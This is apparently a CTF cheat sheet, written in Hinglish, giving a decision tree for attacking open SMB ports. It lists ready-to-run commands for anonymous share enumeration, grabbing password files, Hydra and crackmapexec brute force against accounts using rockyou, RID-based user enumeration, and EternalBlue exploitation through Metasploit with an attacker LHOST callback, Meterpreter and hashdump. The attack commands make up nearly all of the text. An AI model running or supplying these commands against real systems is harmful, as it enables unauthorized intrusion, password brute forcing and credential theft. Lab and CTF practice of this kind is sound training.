# 🔓 SMB PORT OPEN MILA (139/445) — Ab Kya?

---

## CASE 1: Shares Enumerate Karo
```bash
smbclient -L //<IP> -N                    # anonymous listing
enum4linux -a <IP>                         # full enumeration
smbmap -H <IP>                             # permissions check
nmap --script smb-enum-shares -p 445 <IP>  # nmap way
```
> Agar share readable mila → CASE 2 pe jao
> Agar access denied → CASE 3 pe jao

---

## CASE 2: Share Mein Ghuso — Files Dhundo
```bash
smbclient //<IP>/<SHARE> -N               # anonymous access
smbclient //<IP>/<SHARE> -U username       # with creds
# Andar jaake:
smb: \> ls
smb: \> get flag.txt
smb: \> get passwords.txt
```
> Flag mili? Submit karo.
> Creds mili? SSH/RDP/MySQL try karo un creds se.

---

## CASE 3: Brute Force SMB Login
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> smb -t 4
crackmapexec smb <IP> -u users.txt -p passwords.txt
```
> Creds mile → CASE 2 pe wapas jao share access ke liye

---

## CASE 4: OS Version / Hostname Nikalo
```bash
nmap --script smb-os-discovery -p 445 <IP>
crackmapexec smb <IP>
```
> Question mein hostname ya OS version pooch raha ho toh yeh karo

---

## CASE 5: EternalBlue (MS17-010) Check
```bash
nmap --script smb-vuln-ms17-010 -p 445 <IP>
```
> Vulnerable hai? → Exploit karo:
```bash
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <IP>
set LHOST <YOUR_IP>
run
```
> Meterpreter mila → `sysinfo`, `hashdump`, `cat flag.txt`

---

## CASE 6: Users Enumerate Karo
```bash
enum4linux -U <IP>                         # users list
rpcclient -U "" -N <IP>                    # anonymous RPC
rpcclient> enumdomusers
rpcclient> queryuser 0x1f4                 # RID 500 = admin
nmap --script smb-enum-users -p 445 <IP>
```

---

## CASE 7: SMB Version Check Karo
```bash
nmap --script smb-protocols -p 445 <IP>
nmap --script smb2-security-mode -p 445 <IP>
```
> SMBv1 enabled + unpatched = EternalBlue chance

---

## QUICK DECISION:
```
SMB open
  ├─ Anonymous access? → enum4linux → shares browse → files grab
  ├─ Access denied? → hydra/crackmapexec brute force
  ├─ Windows 7/2008? → MS17-010 EternalBlue check
  ├─ Question asks hostname? → smb-os-discovery
  └─ Question asks users? → rpcclient / smb-enum-users
```
